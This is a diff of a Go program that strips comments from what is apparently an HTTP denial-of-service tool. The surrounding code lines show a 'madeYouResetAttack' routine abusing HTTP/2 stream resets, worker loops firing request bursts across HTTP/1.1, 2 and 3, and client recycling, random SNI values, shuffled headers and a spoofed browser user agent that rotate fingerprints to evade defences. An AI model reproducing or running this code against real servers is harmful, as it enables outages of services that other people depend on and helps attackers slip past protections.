@@ -35,7 +35,6 @@ const (
 	clientCycleThreshold  int   = 50
 )
 
-// CircularLogBuffer implements a thread-safe circular buffer for log messages
 type CircularLogBuffer struct {
 	messages [circularLogBufferSize]string
 	index    int
@@ -78,7 +77,7 @@ var (
 	madeYouResetAttempts uint64
 	madeYouResetSuccess  uint64
 	madeYouResetErrors   uint64
-	isShuttingDown       int32 // atomic flag for graceful shutdown
+	isShuttingDown       int32
 )
 
 var (
@@ -225,7 +224,6 @@ func generateRandomPayload(format string) (io.Reader, string) {
 	}
 }
 
-// FIX #1: Added proper error handling for URL parsing
 func randomPath(base string) string {
 	parsed, err := url.Parse(base)
 	if err != nil {
@@ -259,7 +257,6 @@ func randomPath(base string) string {
 	return parsed.String()
 }
 
-// FIX #2: Improved error recording with thread safety
 func recordError(errType string) {
 	errorMux.Lock()
 	defer errorMux.Unlock()
@@ -275,7 +272,6 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 	host := parsed.Hostname()
 	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 
-	// Test HTTP/3 with timeout
 	h3Transport := &http3.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 	}
@@ -291,7 +287,6 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 	}
 	h3Transport.Close()
 
-	// Test HTTP/2 with timeout
 	h2Transport := &http2.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 	}
@@ -306,7 +301,6 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 		respH2.Body.Close()
 	}
 
-	// Test HTTP/1.1 with timeout
 	h1Transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 		TLSNextProto:    make(map[string]func(string, *tls.Conn) http.RoundTripper),
@@ -341,7 +335,6 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 	default:
 	}
 
-	// Check shutdown flag
 	if atomic.LoadInt32(&isShuttingDown) != 0 {
 		return
 	}
@@ -444,7 +437,6 @@ func buildHTTPClient(config *workerConfig, httpVersion string) *http.Client {
 	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
 }
 
-// FIX #5: Enhanced HTTP/3 client with proper resource cleanup
 func buildHTTP3Client(config *workerConfig) *http.Client {
 	sni := randomSNI(config.targetURL)
 	return &http.Client{
@@ -490,7 +482,6 @@ type workerConfig struct {
 	thinkTimeMs       int
 }
 
-// FIX #8: Optimized header shuffling with pre-allocated slice
 var headerKeysPool = make([]string, 0, 16)
 var headerKeysMux sync.Mutex
 
@@ -529,7 +520,6 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 		client = buildHTTPClient(config, httpVersion)
 	}
 
-	// HTTP/2 MadeYouReset goroutine
 	if httpVersion == "2" {
 		go func() {
 			ticker := time.NewTicker(time.Duration(100+mathrand.Intn(200)) * time.Millisecond)
@@ -558,9 +548,7 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 		}()
 	}
 
-	// Main worker loop
 	for {
-		// Check for shutdown or context cancellation
 		select {
 		case <-ctx.Done():
 			if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
@@ -577,7 +565,6 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 			return
 		}
 
-		// Recycle client periodically to rotate fingerprints
 		if burstsSinceLastCycle > clientCycleThreshold {
 			if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
 				transport.CloseIdleConnections()
@@ -603,7 +590,6 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 		}
 
 		for i := 0; i < burstCount; i++ {
-			// Check shutdown before each request
 			if atomic.LoadInt32(&isShuttingDown) != 0 {
 				if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
 					transport.CloseIdleConnections()
@@ -661,7 +647,6 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 				headerSet[randomHeaderName(h)] = getRandomElement([]string{"1", "no-cache", "XMLHttpRequest", "on", "off"})
 			}
 
-			// FIX #8: Optimized header shuffling
 			keys := getHeaderKeySlice(len(headerSet))
 			keys = keys[:0]
 			for k := range headerSet {
@@ -772,7 +757,6 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 		if config.adaptiveDelay {
 			baseDelay = atomic.LoadInt64(&currentDelay)
 		}
-		// FIX #4: Prevent panic when thinkTimeMs is 0
 		thinkTimeMax := int64(config.thinkTimeMs)
 		if thinkTimeMax < 1 {
 			thinkTimeMax = 1
@@ -802,7 +786,6 @@ func monitor(ctx context.Context, duration time.Duration, config *workerConfig) 
 			if config.adaptiveDelay {
 				current := atomic.LoadInt64(&currentDelay)
 				if current > 0 {
-					// FIX #7: Better decay with minimum floor
 					newDelay := int64(float64(current) * 0.92)
 					if newDelay < minDelay {
 						newDelay = minDelay
@@ -1020,7 +1003,6 @@ func main() {
 		return
 	}
 
-	// FIX #12: Validate concurrency
 	if *concurrencyPtr > maxConcurrentWorkers {
 		statusErrColor.Printf("Error: Concurrency cannot exceed %d\n", maxConcurrentWorkers)
 		*concurrencyPtr = maxConcurrentWorkers
@@ -1090,7 +1072,6 @@ func main() {
 		thinkTimeMs:       *thinkTimePtr,
 	}
 
-	// FIX #11: Graceful shutdown handler - properly integrated
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 
@@ -1098,7 +1079,7 @@ func main() {
 		<-sigChan
 		titleColor.Println("\n[*] Graceful shutdown initiated...")
 		atomic.StoreInt32(&isShuttingDown, 1)
-		cancel() // Cancel context to trigger worker exit
+		cancel()
 	}()
 
 	var wg sync.WaitGroup
@@ -1110,9 +1091,7 @@ func main() {
 
 	go monitor(ctx, duration, config)
 
-	// Wait for all workers to finish
 	wg.Wait()
-	
-	// Final cleanup
+
 	titleColor.Println("\n[✓] All workers stopped cleanly")
 }
